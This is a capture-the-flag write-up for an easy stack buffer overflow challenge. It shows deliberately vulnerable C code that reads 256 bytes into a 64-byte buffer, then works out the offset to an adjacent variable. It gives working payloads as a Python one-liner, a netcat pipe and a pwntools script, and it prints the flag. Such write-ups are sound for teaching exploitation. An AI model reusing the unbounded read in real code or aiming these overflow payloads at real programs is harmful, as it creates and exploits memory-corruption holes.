# Easy_Overflow — CTF Writeup

**Category:** Buffer Overflow
**Difficulty:** Easy
**Points:** 100
**Flag:** `ctf{overflowing_variables_like_a_pro}`

## Challenge Description

A simple employee registration application asks for a name before granting
access to an event portal. A hidden "debug mode" reveals confidential
information (the flag) if an internal verification variable is changed from
its default value — without modifying the binary.

## Source Code

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/sendfile.h>
#include <fcntl.h>

void __attribute__((constructor)) setup()
{
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
}

int main()
{
  int check = 0;
  char buffer[64];
  printf("Enter your name: ");
  read(0, buffer, 0x100);
  printf("Hello, %s\n", buffer);
  if(check) {
    printf("You win: ");
    sendfile(1, open("/flag", 0), 0, 0x100);
  } else {
    puts("You lose!");
  }
  return 0;
}
```

## Vulnerability

`buffer` is a 64-byte stack array, but `read()` is called with a size of
`0x100` (256 bytes) — far larger than the buffer. This is a classic **stack
buffer overflow** with no bounds checking.

The `check` variable is declared immediately before `buffer` in the source,
and (per the compiled layout) lands directly adjacent to it on the stack.
Overflowing `buffer` lets us overwrite `check` and flip it to a non-zero
value, triggering the hidden branch that reads and prints `/flag` via
`sendfile()`.

## Finding the Offset

Disassembling `main` (`objdump -d -M intel vuln`):

```
lea rax,[rbp-0x50]            ; buffer starts at rbp-0x50
...
cmp DWORD PTR [rbp-0x4],0x0   ; check lives at rbp-0x4
```

Offset from the start of `buffer` to `check`:

```
0x50 - 0x4 = 0x4c = 76 bytes
```

No stack canary or PIE-dependent return-address overwrite is needed here —
this is a plain adjacent local-variable overwrite.

## Exploit

Send 76 bytes of padding to fill `buffer`, followed by any non-zero 4 bytes
to overwrite `check`:

```python
payload = b"A" * 76 + b"\x01\x00\x00\x00"
```

### Local verification

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\x01\x00\x00\x00')" > payload.bin
cat payload.bin - | ./vuln
```

Output confirms the hidden branch triggers (`You win:` printed):

```
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You win: 
```

(No output after `You win:` locally, since there's no `/flag` file outside
the remote challenge environment.)

### Against the remote instance

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\x01\x00\x00\x00')" | nc <HOST> <PORT>
```

Result:

```
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You win: ctf{overflowing_variables_like_a_pro}
```

## Alternative: pwntools

```python
from pwn import *

io = remote("<HOST>", <PORT>)
payload = b"A" * 76 + b"\x01\x00\x00\x00"
io.sendafter(b"Enter your name: ", payload)
print(io.recvall(timeout=5).decode())
```

## Lessons

- Never trust attacker-controlled input lengths against fixed-size buffers —
  `read(fd, buffer, sizeof_bigger_than_buffer)` is a textbook overflow.
- Adjacent stack variables (like flags/checks) can be overwritten just by
  overflowing a neighboring buffer, with no need to touch the return address,
  bypass ASLR, or defeat a stack canary.
- Always size reads/writes to `sizeof(buffer)`, not an arbitrary constant.
